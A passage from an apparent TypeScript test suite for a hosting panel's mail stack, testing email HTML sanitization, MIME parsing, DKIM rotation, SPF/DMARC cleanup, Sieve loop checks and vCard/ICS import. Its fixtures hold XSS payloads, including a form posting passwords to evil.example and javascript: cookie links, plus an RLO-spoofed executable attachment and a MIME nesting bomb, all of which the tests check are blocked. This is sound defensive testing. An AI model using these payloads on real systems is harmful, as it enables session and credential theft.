          <script>window.parent.fetch('/api/accounts')</script>
          <iframe src="https://evil.example/frame"></iframe>
          <object data="https://evil.example/flash.swf"></object>
          <embed src="https://evil.example/plugin"></embed>
          <svg onload="alert('xss')"><script>alert(2)</script></svg>
          <form action="https://evil.example/steal"><input type="password" name="pw" /></form>
          <div dir="rtl" onclick="stealSession()" style="color: #112233; position: fixed; top: 0; background-image: url(https://evil.example/bg.png); width: expression(alert(1))">
            <p>مرحباً بكم في لوحة البريد الآمنة</p>
            <a href="&#x6a;avascript:alert(document.cookie)" onmouseover="evil()">رابط خبيث</a>
            <a href="https://trusted.example/docs">رابط آمن</a>
            <img src="https://tracker.evil.example/pixel.gif" width="1" height="1" onerror="alert(3)" />
            <img src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==" />
          </div>
        </body>
      </html>
    `

    const report = sanitizeEmailHtml(hostileHtml)
    expect(report.sanitizedHtml).not.toContain('<script')
    expect(report.sanitizedHtml).not.toContain('<iframe')
    expect(report.sanitizedHtml).not.toContain('<object')
    expect(report.sanitizedHtml).not.toContain('<embed')
    expect(report.sanitizedHtml).not.toContain('<svg')
    expect(report.sanitizedHtml).not.toContain('<form')
    expect(report.sanitizedHtml).not.toContain('<base')
    expect(report.sanitizedHtml).not.toContain('<meta')
    expect(report.sanitizedHtml).not.toContain('onclick')
    expect(report.sanitizedHtml).not.toContain('onerror')
    expect(report.sanitizedHtml).not.toContain('onmouseover')
    expect(report.sanitizedHtml).not.toContain('javascript:')
    expect(report.sanitizedHtml).not.toContain('expression(')
    expect(report.sanitizedHtml).not.toContain('position: fixed')
    expect(report.sanitizedHtml).not.toContain('https://tracker.evil.example/pixel.gif')
    expect(report.sanitizedHtml).toContain('data-blocked-remote-image="true"')
    expect(report.sanitizedHtml).toContain('data-blocked-tracking-pixel="true"')
    expect(report.sanitizedHtml).toContain('dir="rtl"')
    expect(report.sanitizedHtml).toContain('مرحباً بكم في لوحة البريد الآمنة')
    expect(report.sanitizedHtml).toContain('rel="noopener noreferrer nofollow"')
    expect(report.blockedRemoteImages).toContain('https://tracker.evil.example/pixel.gif')

    // Test BiDi RLO extension spoofing and dangerous executable attachment detection
    const codec = new MimeCodecAndSanitizer()
    const builtSpoof = codec.buildMimeMessage({
      from: 'sender@alpha.example',
      to: ['alice@alpha.example'],
      subject: 'Invoice with RLO spoofed attachment',
      textBody: 'See attached',
      attachments: [
        {
          filename: '../../evil\u202Efdp.exe',
          contentType: 'application/pdf',
          content: Buffer.from('MZ-fake-executable'),
        },
      ],
    })
    const parsedSpoof = codec.parseMimeMessage(builtSpoof.rawMime)
    expect(parsedSpoof.attachments[0]?.filename).toBe('evilfdp.exe')
    expect(parsedSpoof.attachments[0]?.dangerousExtension).toBe(true)

    // Test excessive MIME nesting bomb rejection
    let nestedMime = 'Content-Type: text/plain; charset=utf-8\r\n\r\nLeaf body'
    for (let i = 0; i < 8; i++) {
      const b = `bound_${i}`
      nestedMime = `Content-Type: multipart/mixed; boundary="${b}"\r\n\r\n--${b}\r\n${nestedMime}\r\n--${b}--`
    }
    expect(() => codec.parseMimeMessage(nestedMime, { maxNestingDepth: 5 })).toThrow(
      /MIME nesting depth .* exceeds maximum allowed depth/,
    )
  })

  // =========================================================================
  // 4. M03: DKIM Signing & Rotation, SPF/DMARC Deduplication & MTA Queue/Log Collector (A43, A44)
  // =========================================================================
  it('M03 (A43, A44): generates and rotates 2048-bit RSA & Ed25519 DKIM keys with selector overlap, reconciles SPF/DMARC without duplicates, enforces outbound rate caps, and incrementally parses MTA logs across rotation', async () => {
    const executor = new FakeHostExecutor()
    const sec = new MailSecurityAndDeliveryAdapter({ executor, os })

    // 1. Generate initial 2048-bit RSA DKIM key for selector s2026a
    const gen1 = await sec.generateOrRotateDkimKey({
      domain: 'alpha.example',
      selector: 's2026a',
      algorithm: 'rsa',
      overlapSeconds: 3600,
      now: new Date('2026-10-22T10:00:00Z'),
    })
    expect(gen1.activeKey.selector).toBe('s2026a')
    expect(gen1.activeKey.dnsName).toBe('s2026a._domainkey')
    expect(gen1.activeKey.dnsTxtValue).toContain('v=DKIM1; k=rsa; p=')
    expect(JSON.stringify(gen1.activeKey)).not.toContain('PRIVATE KEY')

    // Verify private key file on host is 0600 root:opendkim
    const privFile1 = executor.files.get('/etc/opendkim/keys/alpha.example/s2026a.private')
    expect(privFile1?.mode).toBe(0o600)
    expect(privFile1?.owner).toBe('root')
    expect(privFile1?.group).toBe('opendkim')

    // Sign an outbound message with s2026a and verify signature against published DNS TXT
    const codec = new MimeCodecAndSanitizer()
    const { rawMime } = codec.buildMimeMessage({
      from: 'alice@alpha.example',
      to: ['recipient@external.example'],
      subject: 'DKIM Verified Message',
      textBody: 'Cryptographically signed payload.',
    })
    const signed1 = sec.signOutboundMessage(rawMime, 'alpha.example')
    expect(signed1).toContain('DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=alpha.example; s=s2026a;')
    const verify1 = sec.verifyDkimSignature(signed1, gen1.activeKey.dnsTxtValue)
    expect(verify1.valid).toBe(true)

    // Verify body tampering fails DKIM verification
    const tampered = `${signed1}\r\nTampered-Body-Line`
    expect(sec.verifyDkimSignature(tampered, gen1.activeKey.dnsTxtValue).valid).toBe(false)

    // 2. Rotate to Ed25519 selector s2026b and verify s2026a remains in overlapping_previous
    const gen2 = await sec.generateOrRotateDkimKey({
      domain: 'alpha.example',
      selector: 's2026b',
      algorithm: 'ed25519',
      overlapSeconds: 3600,
      now: new Date('2026-10-22T10:30:00Z'),
    })
    expect(gen2.activeKey.selector).toBe('s2026b')
    expect(gen2.overlappingKeys).toHaveLength(1)
    expect(gen2.overlappingKeys[0]?.selector).toBe('s2026a')

    // Sign with new Ed25519 selector s2026b and verify
    const signed2 = sec.signOutboundMessage(rawMime, 'alpha.example')
    expect(signed2).toContain('a=ed25519-sha256')
    expect(sec.verifyDkimSignature(signed2, gen2.activeKey.dnsTxtValue).valid).toBe(true)
    // In-flight message signed with s2026a still verifies against overlapping DNS record
    expect(sec.verifyDkimSignature(signed1, gen2.overlappingKeys[0]!.dnsTxtValue).valid).toBe(true)

    // 3. Reconcile SPF and DMARC on a zone that already has duplicate SPF and DMARC TXT records
    const reconciledDns = sec.reconcileDomainEmailAuthRecords({
      domain: 'alpha.example',
      existingRecords: [
        { id: 'r1', zone: 'alpha.example', name: '@', type: 'A', ttl: 3600, content: '203.0.113.10', priority: null },
        { id: 'spf-old-1', zone: 'alpha.example', name: '@', type: 'TXT', ttl: 3600, content: 'v=spf1 ip4:198.51.100.1 ~all', priority: null },
        { id: 'spf-old-2', zone: 'alpha.example', name: '@', type: 'TXT', ttl: 3600, content: 'v=spf1 a mx ?all', priority: null },
        { id: 'dmarc-old-1', zone: 'alpha.example', name: '_dmarc', type: 'TXT', ttl: 3600, content: 'v=DMARC1; p=none', priority: null },
        { id: 'dmarc-old-2', zone: 'alpha.example', name: '_dmarc', type: 'TXT', ttl: 3600, content: 'v=DMARC1; p=reject', priority: null },
      ],
      ipv4: ['203.0.113.10'],
      ipv6: ['2001:db8::10'],
      spfMode: '-all',
      dmarcPolicy: 'quarantine',
      dmarcAlignmentDkim: 's',
      dmarcAlignmentSpf: 's',
      dkimSelectors: sec.getDkimSelectorRecords('alpha.example'),
    })

    expect(reconciledDns.replacedDuplicateSpfCount).toBe(2)
    expect(reconciledDns.replacedDuplicateDmarcCount).toBe(2)
    const spfRecords = reconciledDns.records.filter(
      (r) => r.type === 'TXT' && r.name === '@' && r.content.startsWith('v=spf1'),
    )
    const dmarcRecords = reconciledDns.records.filter(
      (r) => r.type === 'TXT' && r.name === '_dmarc',
    )
    expect(spfRecords).toHaveLength(1)
    expect(spfRecords[0]?.content).toBe('v=spf1 a mx ip4:203.0.113.10 ip6:2001:db8::10 -all')
    expect(dmarcRecords).toHaveLength(1)
    expect(dmarcRecords[0]?.content).toBe(
      'v=DMARC1; p=quarantine; adkim=s; aspf=s; rua=mailto:postmaster@alpha.example',
    )
    // Both active (s2026b) and overlapping (s2026a) DKIM TXT records are present in the zone
    expect(reconciledDns.dkimRecords.map((r) => r.name).sort()).toEqual([
      's2026a._domainkey',
      's2026b._domainkey',
    ])

    // Prune expired selector after overlap window
    const pruned = await sec.pruneExpiredDkimSelectors(
      'alpha.example',
      new Date('2026-10-22T12:00:00Z'),
    )
    expect(pruned).toEqual(['s2026a'])
    expect(executor.files.has('/etc/opendkim/keys/alpha.example/s2026a.private')).toBe(false)

    // 4. Outbound rate cap enforcement + operator override
    const rateCap = {
      mailboxMaxMessagesPerHour: 2,
      mailboxMaxRecipientsPerHour: 5,
      mailboxMaxBytesPerHour: 1024 * 1024,
      accountMaxMessagesPerHour: 10,
      serverMaxMessagesPerHour: 100,
      exceedAction: 'defer' as const,
    }
    expect(
      sec.evaluateOutboundAbusePolicy(rateCap, {
        accountId: ACCOUNT_A.id,
        mailbox: 'alice@alpha.example',
        recipientCount: 1,
        messageBytes: 1024,
        nowMs: 1_000_000,
      }).allowed,
    ).toBe(true)
    expect(
      sec.evaluateOutboundAbusePolicy(rateCap, {
        accountId: ACCOUNT_A.id,
        mailbox: 'alice@alpha.example',
        recipientCount: 1,
        messageBytes: 1024,
        nowMs: 1_001_000,
      }).allowed,
    ).toBe(true)
    const thirdAttempt = sec.evaluateOutboundAbusePolicy(rateCap, {
      accountId: ACCOUNT_A.id,
      mailbox: 'alice@alpha.example',
      recipientCount: 1,
      messageBytes: 1024,
      nowMs: 1_002_000,
    })
    expect(thirdAttempt.allowed).toBe(false)
    expect(thirdAttempt.outcome).toBe('deferred')
    expect(thirdAttempt.smtpCode).toBe(450)

    const overrideAttempt = sec.evaluateOutboundAbusePolicy(rateCap, {
      accountId: ACCOUNT_A.id,
      mailbox: 'alice@alpha.example',
      recipientCount: 1,
      messageBytes: 1024,
      nowMs: 1_003_000,
      operatorOverrideReason: 'Approved transactional invoice batch #42',
    })
    expect(overrideAttempt.allowed).toBe(true)
    expect(overrideAttempt.outcome).toBe('operator_override')

    // 5. Incremental MTA queue/log collector across log rotation + UUID rejection
    expect(() => assertRealMtaQueueId('550e8400-e29b-41d4-a716-446655440000')).toThrow(
      /is a UUID, not a real MTA queue ID/,
    )

    const initialLog = [
      '2026-10-22T12:00:01Z host postfix/submission/smtpd[101]: 4X9kLm2pQz10aB: client=localhost[127.0.0.1], sasl_method=PLAIN, sasl_username=alice@alpha.example',
      '2026-10-22T12:00:02Z host postfix/qmgr[102]: 4X9kLm2pQz10aB: from=<alice@alpha.example>, size=4096, nrcpt=1 (queue active)',
      '2026-10-22T12:00:03Z host postfix/smtp[103]: 4X9kLm2pQz10aB: to=<bob@external.example>, relay=mx.external.example[198.51.100.25]:25, status=deferred (host mx.external.example[198.51.100.25] said: 451 4.7.1 Greylisted <script>evil()</script>)',
    ].join('\n')

    const batch1 = sec.collectMailDeliveryEvents({
      path: '/var/log/mail.log',
      inode: 'inode-100',
      content: initialLog,
    })
    expect(batch1.rotated).toBe(false)
    expect(batch1.events.map((e) => e.stage)).toEqual(['accepted', 'queued', 'deferred'])
    expect(batch1.events[2]?.queueId).toBe('4X9kLm2pQz10aB')
    expect(batch1.events[2]?.smtpCode).toBe(451)
    expect(batch1.events[2]?.sanitizedDiagnostic).not.toContain('<script>')
    expect(batch1.events[2]?.sanitizedDiagnostic).toContain('&lt;script&gt;')

    // Append a line to the old inode before rotation AND rotate to inode-101 with new lines
    const preRotateFull = `${initialLog}\n2026-10-22T12:05:00Z host postfix/smtp[103]: 4X9kLm2pQz10aB: to=<bob@external.example>, relay=mx.external.example[198.51.100.25]:25, status=sent (250 2.0.0 Ok: queued as EXT991)`
    const postRotateNew = [
      '2026-10-22T12:06:00Z host postfix/smtpd[104]: NOQUEUE: reject: RCPT from unknown[192.0.2.99]: 554 5.7.1 <spam@target.example>: Relay access denied; from=<bad@actor.example> to=<spam@target.example>',
      '2026-10-22T12:06:10Z host postfix/qmgr[102]: 4X9kLm9bNc77zP: from=<eve@beta.example>, size=1200, nrcpt=1 (queue active)',
      '2026-10-22T12:06:11Z host postfix/lmtp[105]: 4X9kLm9bNc77zP: to=<missing@beta.example>, relay=mail.xpanel.internal[private/dovecot-lmtp], status=bounced (host mail.xpanel.internal[private/dovecot-lmtp] said: 550 5.1.1 <missing@beta.example> User doesn\'t exist)',
    ].join('\n')

    const batch2 = sec.collectMailDeliveryEvents({
      path: '/var/log/mail.log',
      inode: 'inode-101',
      content: postRotateNew,
      rotatedPreviousInode: 'inode-100',
      rotatedPreviousContent: preRotateFull,
    })
    expect(batch2.rotated).toBe(true)
    // Only the new lines (1 from remainder of old inode + 3 from new inode) are emitted — no double counting!
    expect(batch2.events.map((e) => e.stage)).toEqual([
      'delivered',
      'rejected',
      'queued',
      'bounced',
    ])

    // Verify owner scoping: Tenant A only sees alpha.example events, never beta.example
    const allEvents = [...batch1.events, ...batch2.events]
    const tenantAEvents = sec.filterEventsForOwner(allEvents, {
      isRoot: false,
      ownedDomains: ['alpha.example'],
    })
    expect(tenantAEvents.every((e) => e.domain === 'alpha.example')).toBe(true)
    expect(tenantAEvents.some((e) => e.queueId === '4X9kLm9bNc77zP')).toBe(false)
  })

  // =========================================================================
  // 5. M04: Unified Sieve + Vacation Compiler, Loop Detection & Atomic Install (A45)
  // =========================================================================
  it('M04 (A45): detects intra-domain & cross-account forwarding/redirect loops, prevents vacation backscatter, preserves previous generation on sievec failure, and removes .svbin/.sieve when last rule is deleted', async () => {
    const executor = new FakeHostExecutor()
    const sieve = new SieveAndForwarderAdapter({ executor })

    // 1. Detect cross-account forwarding + Sieve redirect loop:
    // alice@alpha.example -> forwarder to bob@alpha.example -> forwarder to eve@beta.example -> Sieve redirect to alice@alpha.example
    await expect(
      sieve.compileAndInstallMailboxSieve({
        actor: { kind: 'mailbox', boundMailbox: 'eve@beta.example', accountId: ACCOUNT_B.id },
        account: ACCOUNT_B,
        mailbox: 'eve@beta.example',
        existingForwarders: [
          { source: 'alice@alpha.example', destinations: ['bob@alpha.example'] },
          { source: 'bob@alpha.example', destinations: ['eve@beta.example'] },
        ],
        filters: [
          {
            name: 'Loopback Redirect',
            match: 'all',
            tests: [{ field: 'subject', op: 'contains', value: 'Invoice' }],
            actions: [{ kind: 'redirect', to: 'alice@alpha.example' }],
          },
        ],
      }),
    ).rejects.toThrow(/Sieve redirect \/ forwarding loop detected/)

    // 2. Principal isolation: mailbox A cannot modify mailbox B's Sieve rules
    await expect(
      sieve.compileAndInstallMailboxSieve({
        actor: { kind: 'mailbox', boundMailbox: 'alice@alpha.example', accountId: ACCOUNT_A.id },
        account: ACCOUNT_B,
        mailbox: 'eve@beta.example',
        filters: [],
      }),
    ).rejects.toThrow(/cannot modify Sieve rules of "eve@beta\.example"/)

    // 3. Install valid filters + vacation on alice@alpha.example
    const install1 = await sieve.compileAndInstallMailboxSieve({
      actor: { kind: 'mailbox', boundMailbox: 'alice@alpha.example', accountId: ACCOUNT_A.id },
      account: ACCOUNT_A,
      mailbox: 'alice@alpha.example',
      filters: [
        {
          name: 'Drop Known Spam',
          match: 'all',
          tests: [{ field: 'subject', op: 'contains', value: '[SPAM-DROP]' }],
          actions: [{ kind: 'discard' }],
        },
        {
          name: 'Invoices Folder',
          match: 'all',
          tests: [{ field: 'subject', op: 'contains', value: 'فاتورة' }],
          actions: [{ kind: 'fileinto', folder: 'Invoices' }, { kind: 'mark-read' }],
        },
      ],
      vacation: {
        subject: 'خارج المكتب — Out of Office',
        body: 'أنا في إجازة حالياً وسأرد قريباً.',
        days: 2,
      },
    })

    expect(install1.removedAllFiles).toBe(false)
    expect(install1.compiledScript).toContain('Auto-Submitted')
    expect(install1.compiledScript).toContain('List-Id')
    expect(executor.files.get(install1.activeSievePath)?.owner).toBe('tenanta')
    expect(executor.files.get(install1.activeSvbinPath)?.owner).toBe('tenanta')

    // 4. Simulate `sievec` compilation failure on update -> previous active script must remain intact
    executor.failCommand('/usr/bin/sievec', 1, 'sievec: error: simulated syntax failure')
    await expect(
      sieve.compileAndInstallMailboxSieve({
        actor: { kind: 'mailbox', boundMailbox: 'alice@alpha.example', accountId: ACCOUNT_A.id },
        account: ACCOUNT_A,
        mailbox: 'alice@alpha.example',
        filters: [
          {
            name: 'Broken Update',
            match: 'all',
            tests: [{ field: 'subject', op: 'contains', value: 'Test' }],
            actions: [{ kind: 'keep' }],
          },
        ],
      }),
    ).rejects.toThrow(/sievec compilation failed/)
    executor.clearCommandFailures()

    expect(executor.files.get(install1.activeSievePath)?.content).toBe(install1.compiledScript)

    // 5. Evaluate delivery against active Sieve script:
    // 5a. Arabic invoice matches `fileinto "Invoices"` + `mark-read` + triggers vacation once for human sender
    const delivery1 = sieve.evaluateDeliveryAgainstActiveSieve(
      'alice@alpha.example',
      {
        from: 'client@partner.example',
        to: 'alice@alpha.example',
        subject: 'فاتورة شهر أكتوبر',
        body: 'مرفق الفاتورة.',
      },
      1_000_000,
    )
    expect(delivery1.disposition).toBe('fileinto')
    expect(delivery1.folder).toBe('Invoices')
    expect(delivery1.markedRead).toBe(true)
    expect(delivery1.vacationTriggered).toBe(true)

    // 5b. Second message from same sender within `:days 2` suppresses duplicate vacation reply
    const delivery2 = sieve.evaluateDeliveryAgainstActiveSieve(
      'alice@alpha.example',
      {
        from: 'client@partner.example',
        to: 'alice@alpha.example',
        subject: 'متابعة',
        body: 'رسالة ثانية.',
      },
      1_000_000 + 3600 * 1000,
    )
    expect(delivery2.vacationTriggered).toBe(false)
    expect(delivery2.vacationSuppressedReason).toContain('Minimum reply interval')

    // 5c. Mailing list / Auto-Submitted message never triggers vacation backscatter
    const listDelivery = sieve.evaluateDeliveryAgainstActiveSieve(
      'alice@alpha.example',
      {
        from: 'announcer@lists.example',
        to: 'alice@alpha.example',
        subject: 'Newsletter',
        headers: { 'List-Id': '<news.lists.example>', 'Precedence': 'list' },
        body: 'List content',
      },
      200_000_000,
    )
    expect(listDelivery.vacationTriggered).toBe(false)
    expect(listDelivery.vacationSuppressedReason).toContain('Precedence')

    // 5d. Discarded message stops script execution and does not trigger vacation
    const spamDelivery = sieve.evaluateDeliveryAgainstActiveSieve(
      'alice@alpha.example',
      {
        from: 'spammer@bad.example',
        to: 'alice@alpha.example',
        subject: '[SPAM-DROP] Win free prize',
        body: 'Spam',
      },
      300_000_000,
    )
    expect(spamDelivery.disposition).toBe('discard')
    expect(spamDelivery.vacationTriggered).toBe(false)

    // 6. Delete last rule and vacation -> removes both .dovecot.sieve and .dovecot.svbin
    const removedRes = await sieve.compileAndInstallMailboxSieve({
      actor: { kind: 'mailbox', boundMailbox: 'alice@alpha.example', accountId: ACCOUNT_A.id },
      account: ACCOUNT_A,
      mailbox: 'alice@alpha.example',
      filters: [],
      vacation: null,
    })
    expect(removedRes.removedAllFiles).toBe(true)
    expect(executor.files.has(install1.activeSievePath)).toBe(false)
    expect(executor.files.has(install1.activeSvbinPath)).toBe(false)
  })

  // =========================================================================
  // 6. M05: Contacts (vCard 3.0/4.0) & Calendars (iCalendar RFC 5545) Authority (A46)
  // =========================================================================
  it('M05 (A46): preserves external UIDs, timezones/RRULE, and Arabic UTF-8 across vCard/ICS round-trips, enforces revision CAS, blocks share escalation, and revokes access immediately', () => {
    const pda = new PersonalDataAuthority()

    // Verify DAV network status is explicitly honest
    expect(pda.getNetworkDavCapabilityStatus()).toEqual({
      networkDavServerActive: false,
      status: 'unavailable_until_qualified',
      supportedLocalFormats: ['vcard-3.0', 'vcard-4.0', 'icalendar-2.0'],
    })

    // 1. Create calendar for alice@alpha.example
    const cal = pda.createCalendar('alice@alpha.example', {
      name: 'تقويم العمل — ٢٠٢٦',
      timezone: 'Asia/Riyadh',
    })
    expect(cal.name).toBe('تقويم العمل — 2026')

    // Unshared user (eve@beta.example) gets NOT_FOUND with zero metadata leak
    expect(() => pda.getCalendar('eve@beta.example', cal.id)).toThrow(/calendar not found/)
    expect(pda.listCalendars('eve@beta.example')).toHaveLength(0)

    // 2. Import Arabic RFC 5545 ICS with external UID, TZID, RRULE, EXDATE, RECURRENCE-ID, and hostile field
    const icsPayload = [
      'BEGIN:VCALENDAR',
      'VERSION:2.0',
      'PRODID:-//ExternalClient//AR',
      'X-WR-TIMEZONE:Asia/Riyadh',
      'BEGIN:VEVENT',
      'UID:ext-event-2026-9988@external.example',
      'SUMMARY:اجتماع مراجعة الميزانية <script>alert(1)</script>',
      'DESCRIPTION:مناقشة خطة الربع الرابع ٢٠٢٦',
      'LOCATION:الرياض - القاعة الرئيسية',
      'DTSTART;TZID=Asia/Riyadh:20261025T093000',
      'DTEND;TZID=Asia/Riyadh:20261025T103000',
      'RRULE:FREQ=WEEKLY;COUNT=12;BYDAY=SU',
      'EXDATE;TZID=Asia/Riyadh:20261108T093000',
      'RECURRENCE-ID;TZID=Asia/Riyadh:20261025T093000',
      'ATTACH:javascript:alert(1)',
      'X-CUSTOM-DEPT:Finance',
      'END:VEVENT',
      'END:VCALENDAR',
    ].join('\r\n')

    const icsImport1 = pda.importIcs('alice@alpha.example', cal.id, icsPayload)
    expect(icsImport1.imported).toHaveLength(1)
    expect(icsImport1.blockedHostileFields).toEqual(
      expect.arrayContaining(['VEVENT.SUMMARY', 'VEVENT.ATTACH']),
    )
    expect(icsImport1.unsupportedPreview).toEqual([
      { externalUid: 'ext-event-2026-9988@external.example', properties: ['X-CUSTOM-DEPT'] },
    ])

    const ev = icsImport1.imported[0]!
    expect(ev.externalUid).toBe('ext-event-2026-9988@external.example')
    expect(ev.id).not.toBe(ev.externalUid)
    expect(ev.summary).toBe('اجتماع مراجعة الميزانية')
    expect(ev.description).toBe('مناقشة خطة الربع الرابع 2026')
    expect(ev.timezone).toBe('Asia/Riyadh')
    expect(ev.rrule).toBe('FREQ=WEEKLY;COUNT=12;BYDAY=SU')
    expect(ev.exdates).toEqual(['20261108T093000'])
    expect(ev.revision).toBe(1)

    // Idempotent re-import of identical ICS does not duplicate or bump revision
    const icsImportIdem = pda.importIcs('alice@alpha.example', cal.id, icsPayload)
    expect(icsImportIdem.imported).toHaveLength(0)
    expect(icsImportIdem.updated).toHaveLength(1)
    expect(icsImportIdem.updated[0]?.revision).toBe(1)
    expect(pda.listEvents('alice@alpha.example', cal.id)).toHaveLength(1)

    // 3. Share calendar with bob@alpha.example as `read-write` and carol@alpha.example as `read`
    pda.shareCalendar('alice@alpha.example', cal.id, 'bob@alpha.example', 'read-write')
    pda.shareCalendar('alice@alpha.example', cal.id, 'carol@alpha.example', 'read')

    // `read` participant can read and export, but CANNOT modify events
    expect(pda.listEvents('carol@alpha.example', cal.id)).toHaveLength(1)
    expect(() =>
      pda.upsertEvent('carol@alpha.example', cal.id, {
        id: ev.id,
        summary: 'Unauthorized edit by read-only user',
        dtstart: ev.dtstart,
        dtend: ev.dtend,
      }),
    ).toThrow(/calendar is shared read-only/)

    // `read-write` participant (bob) CAN update the event with matching revision,
    // but CANNOT escalate sharing or share with eve@beta.example!
    expect(() =>
      pda.shareCalendar('bob@alpha.example', cal.id, 'eve@beta.example', 'read'),
    ).toThrow(/only the calendar owner can grant or escalate sharing permissions/)

    const updatedEv = pda.upsertEvent('bob@alpha.example', cal.id, {
      id: ev.id,
      summary: 'اجتماع مراجعة الميزانية — محدث',
      description: ev.description,
      location: ev.location,
      dtstart: ev.dtstart,
      dtend: ev.dtend,
      expectedRevision: 1,
    })
    expect(updatedEv.revision).toBe(2)

    // Stale revision update or stale re-import is caught (CONFLICT / conflicts preview)
    expect(() =>
      pda.upsertEvent('alice@alpha.example', cal.id, {
        id: ev.id,
        summary: 'Stale overwrite attempt',
        dtstart: ev.dtstart,
        dtend: ev.dtend,
        expectedRevision: 1,
      }),
    ).toThrow(/calendar event revision conflict: expected 1, actual 2/)

    const staleReimport = pda.importIcs('alice@alpha.example', cal.id, icsPayload, {
      expectedRevisionsByExternalUid: { 'ext-event-2026-9988@external.example': 1 },
    })
    expect(staleReimport.conflicts).toHaveLength(1)
    expect(staleReimport.conflicts[0]?.existingRevision).toBe(2)

    // 4. Revoke bob's share and verify immediate denial of get, list, update, and export
    pda.revokeCalendarShare('alice@alpha.example', cal.id, 'bob@alpha.example')
    expect(() => pda.getCalendar('bob@alpha.example', cal.id)).toThrow(/calendar not found/)
    expect(() => pda.exportIcs('bob@alpha.example', cal.id)).toThrow(/calendar not found/)
    expect(() =>
      pda.upsertEvent('bob@alpha.example', cal.id, {
        id: ev.id,
        summary: 'After revoke edit',
        dtstart: ev.dtstart,
        dtend: ev.dtend,
      }),
    ).toThrow(/calendar not found/)

    // Export ICS as owner and verify external UID, TZID, RRULE, EXDATE, and Arabic summary round-trip
    const exportedIcs = pda.exportIcs('alice@alpha.example', cal.id)
    expect(exportedIcs).toContain('UID:ext-event-2026-9988@external.example')
    expect(exportedIcs).toContain('SUMMARY:اجتماع مراجعة الميزانية — محدث')
    expect(exportedIcs).toContain('DTSTART;TZID=Asia/Riyadh:20261025T093000')
    expect(exportedIcs).toContain('RRULE:FREQ=WEEKLY;COUNT=12;BYDAY=SU')
    expect(exportedIcs).toContain('EXDATE;TZID=Asia/Riyadh:20261108T093000')

    // 5. Arabic vCard 3.0/4.0 round-trip with external UID, Eastern Arabic phone digits -> ASCII, and hostile URI blocking
    const vcardInput = [
      'BEGIN:VCARD',
      'VERSION:4.0',
      'UID:urn:uuid:contact-arabic-2026-001',
      'FN:د. محمود الحسيني <img src=x onerror=alert(1)>',
      'N:الحسيني;محمود;;;د.',
      'EMAIL;TYPE=WORK:mahmoud@alpha.example',
      'TEL;TYPE=CELL:+٩٦٦٥٠١٢٣٤٥٦٧',
      'ORG:شركة التقنية المتقدمة',
      'TITLE:مدير البنية التحتية',
      'PHOTO;VALUE=URI:https://tracker.evil.example/photo.jpg',
      'CATEGORIES:Engineering,Leadership',
      'END:VCARD',
    ].join('\r\n')

    const vcardImport = pda.importVcards('alice@alpha.example', vcardInput)
    expect(vcardImport.imported).toHaveLength(1)
    expect(vcardImport.blockedHostileFields).toEqual(
      expect.arrayContaining(['VCARD.FN', 'VCARD.PHOTO']),
    )

    const contact = vcardImport.imported[0]!
    expect(contact.externalUid).toBe('urn:uuid:contact-arabic-2026-001')
    expect(contact.fullName).toBe('د. محمود الحسيني')
    expect(contact.phones).toEqual(['+966501234567'])
    expect(toAsciiDigits('٢٠٢٦/١٠/٢٢')).toBe('2026/10/22')

    const exportedVcard = pda.exportVcards('alice@alpha.example')
    expect(exportedVcard).toContain('UID:urn:uuid:contact-arabic-2026-001')
    expect(exportedVcard).toContain('FN:د. محمود الحسيني')
    expect(exportedVcard).toContain('TEL;TYPE=CELL:+966501234567')
    expect(exportedVcard).toContain('ORG:شركة التقنية المتقدمة')
    expect(exportedVcard).not.toContain('tracker.evil.example')

    // Cross-tenant export attempt by eve@beta.example fails with NOT_FOUND
    expect(() => pda.exportVcards('eve@beta.example', [contact.id])).toThrow(/contact not found/)
  })
})
